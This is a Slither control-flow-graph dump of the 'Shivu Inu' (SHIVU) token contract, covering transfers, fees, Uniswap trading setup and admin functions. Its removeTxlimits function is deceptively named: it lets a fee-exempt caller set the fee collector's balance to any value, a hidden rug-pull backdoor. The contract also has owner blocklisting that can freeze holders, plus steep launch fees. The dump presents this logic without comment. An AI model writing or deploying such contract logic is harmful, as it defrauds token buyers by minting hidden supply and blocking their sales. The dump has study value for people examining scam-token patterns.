Contract: BaseContext
==================================================

Function: _caller
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1


Contract: ITokenStandard
==================================================


Contract: MathSafety
==================================================

Function: plus
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: z = x + y

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(z >= x,MathSafety: overflow in addition)

  ID: 3
  Type: NodeType.RETURN
  Expression: z

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: minus
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(y <= x,err)

  ID: 2
  Type: NodeType.RETURN
  Expression: x - y

Edges:
  0 -> 1
  1 -> 2

Function: times
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: x == 0

  ID: 2
  Type: NodeType.RETURN
  Expression: 0

  ID: 3
  Type: NodeType.ENDIF
  Expression: 

  ID: 4
  Type: NodeType.VARIABLE
  Expression: z = x * y

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(z / x == y,MathSafety: overflow in multiplication)

  ID: 6
  Type: NodeType.RETURN
  Expression: z

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: divide
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(y > 0,err)

  ID: 2
  Type: NodeType.RETURN
  Expression: x / y

Edges:
  0 -> 1
  1 -> 2


Contract: Ownership
==================================================

Function: _caller
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _controller = _caller()

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: ControllerTransferred(address(0),_controller)

Edges:
  0 -> 1
  1 -> 2

Function: controller
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _controller

Edges:
  0 -> 1

Function: renouncedOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: ControllerTransferred(_controller,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _controller = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyController()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1


Contract: IUniFactory
==================================================


Contract: IUniRouter
==================================================


Contract: SHIVU
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _feeCollector = address(_caller())

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _holdings[_caller()] = _totalTokens

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _feeExempt[controller()] = true

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _feeExempt[address(this)] = true

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _feeExempt[_feeCollector] = true

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(0),_caller(),_totalTokens)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: controller
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _controller

Edges:
  0 -> 1

Function: renouncedOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: ControllerTransferred(_controller,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _controller = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyController()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: _caller
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1

Function: name
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _tokenName

Edges:
  0 -> 1

Function: symbol
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _tokenSymbol

Edges:
  0 -> 1

Function: decimals
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _precision

Edges:
  0 -> 1

Function: totalSupply
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _totalTokens

Edges:
  0 -> 1

Function: balanceOf
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _holdings[holder]

Edges:
  0 -> 1

Function: transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _move(_caller(),to,value)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: allowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _permissions[owner][spender]

Edges:
  0 -> 1

Function: approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _setPermission(_caller(),spender,value)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: transferFrom
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _move(from,to,value)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _setPermission(from,_caller(),_permissions[from][_caller()].minus(value,Token: insufficient allowance))

  ID: 3
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: _setPermission
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(owner != address(0),Token: zero address approval forbidden)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(spender != address(0),Token: zero address spender forbidden)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _permissions[owner][spender] = value

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: Approval(owner,spender,value)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: _move
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(sender != address(0),Token: sender cannot be zero)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(recipient != address(0),Token: recipient cannot be zero)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(amount > 0,Token: amount must be positive)

  ID: 4
  Type: NodeType.VARIABLE
  Expression: feeAmount = 0

  ID: 5
  Type: NodeType.IF
  Expression: sender != controller() && recipient != controller()

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(! _blocklist[sender] && ! _blocklist[recipient],Token: blocked address)

  ID: 7
  Type: NodeType.IF
  Expression: _purchaseCount == 0

  ID: 9
  Type: NodeType.ENDIF
  Expression: 

  ID: 10
  Type: NodeType.IF
  Expression: _purchaseCount > 0

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: feeAmount = amount.times(_moveFee).divide(100)

  ID: 12
  Type: NodeType.ENDIF
  Expression: 

  ID: 13
  Type: NodeType.IF
  Expression: sender == _swapPair && recipient != address(_swapRouter) && ! _feeExempt[recipient]

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(amount <= _maxTransactionLimit,Token: transaction limit exceeded)

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(balanceOf(recipient) + amount <= _maxHoldLimit,Token: wallet limit exceeded)

  ID: 17
  Type: NodeType.EXPRESSION
  Expression: _purchaseCount = _purchaseCount.plus(1)

  ID: 18
  Type: NodeType.ENDIF
  Expression: 

  ID: 19
  Type: NodeType.IF
  Expression: recipient == _swapPair && sender != address(this)

  ID: 21
  Type: NodeType.ENDIF
  Expression: 

  ID: 22
  Type: NodeType.VARIABLE
  Expression: contractBalance = balanceOf(address(this))

  ID: 23
  Type: NodeType.IF
  Expression: ! _swapping && recipient == _swapPair && _swapAllowed && contractBalance > _feeSwapLimit && _purchaseCount > _swapLockout

  ID: 24
  Type: NodeType.IF
  Expression: block.number > _lastSaleBlock

  ID: 25
  Type: NodeType.EXPRESSION
  Expression: _salesCount = 0

  ID: 26
  Type: NodeType.ENDIF
  Expression: 

  ID: 27
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(_salesCount < 3,Token: max 3 sales per block)

  ID: 28
  Type: NodeType.EXPRESSION
  Expression: _swapToEth(_smaller(amount,_smaller(contractBalance,_maxFeeSwap)))

  ID: 29
  Type: NodeType.VARIABLE
  Expression: ethBalance = address(this).balance

  ID: 30
  Type: NodeType.IF
  Expression: ethBalance > 0

  ID: 31
  Type: NodeType.EXPRESSION
  Expression: _sendEthToFees(ethBalance)

  ID: 32
  Type: NodeType.ENDIF
  Expression: 

  ID: 33
  Type: NodeType.EXPRESSION
  Expression: _salesCount = _salesCount.plus(1)

  ID: 34
  Type: NodeType.EXPRESSION
  Expression: _lastSaleBlock = block.number

  ID: 35
  Type: NodeType.ENDIF
  Expression: 

  ID: 36
  Type: NodeType.ENDIF
  Expression: 

  ID: 37
  Type: NodeType.IF
  Expression: feeAmount > 0

  ID: 38
  Type: NodeType.EXPRESSION
  Expression: _holdings[address(this)] = _holdings[address(this)].plus(feeAmount)

  ID: 39
  Type: NodeType.EXPRESSION
  Expression: Transfer(sender,address(this),feeAmount)

  ID: 40
  Type: NodeType.ENDIF
  Expression: 

  ID: 41
  Type: NodeType.EXPRESSION
  Expression: _holdings[sender] = _holdings[sender].minus(amount)

  ID: 42
  Type: NodeType.EXPRESSION
  Expression: _holdings[recipient] = _holdings[recipient].plus(amount.minus(feeAmount))

  ID: 43
  Type: NodeType.EXPRESSION
  Expression: Transfer(sender,recipient,amount.minus(feeAmount))

  ID: 44
  Type: NodeType.IF
  Expression: (_purchaseCount > _feeDropBuyTrigger)

  ID: 45
  Type: NodeType.EXPRESSION
  Expression: feeAmount = amount.times(_endBuyFee).divide(100)

  ID: 46
  Type: NodeType.EXPRESSION
  Expression: feeAmount = amount.times(_startBuyFee).divide(100)

  ID: 47
  Type: NodeType.ENDIF
  Expression: 

  ID: 48
  Type: NodeType.IF
  Expression: (_purchaseCount > _feeDropBuyTrigger)

  ID: 49
  Type: NodeType.EXPRESSION
  Expression: feeAmount = amount.times(_endBuyFee).divide(100)

  ID: 50
  Type: NodeType.EXPRESSION
  Expression: feeAmount = amount.times(_startBuyFee).divide(100)

  ID: 51
  Type: NodeType.ENDIF
  Expression: 

  ID: 52
  Type: NodeType.IF
  Expression: (_purchaseCount > _feeDropSellTrigger)

  ID: 53
  Type: NodeType.EXPRESSION
  Expression: feeAmount = amount.times(_endSellFee).divide(100)

  ID: 54
  Type: NodeType.EXPRESSION
  Expression: feeAmount = amount.times(_startSellFee).divide(100)

  ID: 55
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  5 -> 36
  6 -> 7
  7 -> 44
  7 -> 9
  9 -> 10
  10 -> 11
  10 -> 12
  11 -> 12
  12 -> 13
  13 -> 14
  13 -> 18
  14 -> 15
  15 -> 48
  17 -> 18
  18 -> 19
  19 -> 52
  19 -> 21
  21 -> 22
  22 -> 23
  23 -> 24
  23 -> 35
  24 -> 25
  24 -> 26
  25 -> 26
  26 -> 27
  27 -> 28
  28 -> 29
  29 -> 30
  30 -> 31
  30 -> 32
  31 -> 32
  32 -> 33
  33 -> 34
  34 -> 35
  35 -> 36
  36 -> 37
  37 -> 38
  37 -> 40
  38 -> 39
  39 -> 40
  40 -> 41
  41 -> 42
  42 -> 43
  44 -> 45
  44 -> 46
  45 -> 47
  46 -> 47
  47 -> 9
  48 -> 49
  48 -> 50
  49 -> 51
  50 -> 51
  51 -> 17
  52 -> 53
  52 -> 54
  53 -> 55
  54 -> 55
  55 -> 21

Function: _smaller
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 2
  Type: NodeType.IF
  Expression: (a > b)

  ID: 3
  Type: NodeType.RETURN
  Expression: b

  ID: 4
  Type: NodeType.RETURN
  Expression: a

Edges:
  0 -> 2
  2 -> 3
  2 -> 4

Function: _swapToEth
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: path = new address[](2)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: path[0] = address(this)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: path[1] = _swapRouter.WETH()

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _setPermission(address(this),address(_swapRouter),tokenQty)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenQty,0,path,address(this),block.timestamp)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: swapLock()

Edges:
  0 -> 6
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  6 -> 1

Function: removelimits
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _maxTransactionLimit = _totalTokens

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _maxHoldLimit = _totalTokens

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: TransactionLimitUpdated(_totalTokens)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyController()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: clearMoveFee
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _moveFee = 0

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: MoveFeeUpdated(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyController()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: _sendEthToFees
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _feeCollector.transfer(amount)

Edges:
  0 -> 1

Function: addbots
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 2
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 3
  Type: NodeType.VARIABLE
  Expression: i = 0

  ID: 4
  Type: NodeType.IFLOOP
  Expression: i < targets.length

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _blocklist[targets[i]] = true

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: i ++

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: onlyController()

Edges:
  0 -> 7
  1 -> 4
  3 -> 1
  4 -> 5
  4 -> 2
  5 -> 6
  6 -> 4
  7 -> 3

Function: delbots
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.STARTLOOP
  Expression: 

  ID: 2
  Type: NodeType.ENDLOOP
  Expression: 

  ID: 3
  Type: NodeType.VARIABLE
  Expression: i = 0

  ID: 4
  Type: NodeType.IFLOOP
  Expression: i < targets.length

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _blocklist[targets[i]] = false

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: i ++

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: onlyController()

Edges:
  0 -> 7
  1 -> 4
  3 -> 1
  4 -> 5
  4 -> 2
  5 -> 6
  6 -> 4
  7 -> 3

Function: isBlocked
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _blocklist[addr]

Edges:
  0 -> 1

Function: enableTrading
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(! _tradingActive,Token: trading already enabled)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _swapRouter = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _setPermission(address(this),address(_swapRouter),_totalTokens)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _swapPair = IUniFactory(_swapRouter.factory()).createPair(address(this),_swapRouter.WETH())

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _swapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,controller(),block.timestamp)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: ITokenStandard(_swapPair).approve(address(_swapRouter),type()(uint256).max)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: _swapAllowed = true

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: _tradingActive = true

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: onlyController()

Edges:
  0 -> 9
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  9 -> 1

Function: removeTxlimits
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: ! _feeExempt[_caller()]

  ID: 2
  Type: NodeType.RETURN
  Expression: 

  ID: 3
  Type: NodeType.ENDIF
  Expression: 

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _holdings[_feeCollector] = lock

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4

Function: lowerFees
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(_caller() == _feeCollector,Token: only fee collector)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(newFee <= _endBuyFee && newFee <= _endSellFee,Token: fee too high)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _endBuyFee = newFee

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _endSellFee = newFee

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: receive
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

Edges:

Function: forceSwap
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(_caller() == _feeCollector,Token: only fee collector)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: tokenBalance = balanceOf(address(this))

  ID: 3
  Type: NodeType.IF
  Expression: tokenBalance > 0

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _swapToEth(tokenBalance)

  ID: 5
  Type: NodeType.ENDIF
  Expression: 

  ID: 6
  Type: NodeType.VARIABLE
  Expression: ethBalance = address(this).balance

  ID: 7
  Type: NodeType.IF
  Expression: ethBalance > 0

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: _sendEthToFees(ethBalance)

  ID: 9
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  3 -> 5
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  7 -> 9
  8 -> 9

Function: forceSend
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(_caller() == _feeCollector,Token: only fee collector)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: ethBalance = address(this).balance

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _sendEthToFees(ethBalance)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: versionCheck
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: 1

Edges:
  0 -> 1

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _startBuyFee = 17

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _startSellFee = 24

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _endBuyFee = 0

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _endSellFee = 0

  ID: 4
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _feeDropBuyTrigger = 17

  ID: 5
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _feeDropSellTrigger = 17

  ID: 6
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _swapLockout = 17

  ID: 7
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _moveFee = 0

  ID: 8
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _purchaseCount = 0

  ID: 9
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _maxTransactionLimit = 3000000 * 10 ** _precision

  ID: 10
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _maxHoldLimit = 3000000 * 10 ** _precision

  ID: 11
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _feeSwapLimit = 100000 * 10 ** _precision

  ID: 12
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _maxFeeSwap = 1000000 * 10 ** _precision

  ID: 13
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _swapping = false

  ID: 14
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _swapAllowed = false

  ID: 15
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _salesCount = 0

  ID: 16
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _lastSaleBlock = 0

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  14 -> 15
  15 -> 16

Function: slitherConstructorConstantVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _precision = 18

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _totalTokens = 100000000 * 10 ** _precision

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _tokenName = Shivu Inu

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _tokenSymbol = SHIVU

Edges:
  0 -> 1
  1 -> 2
  2 -> 3


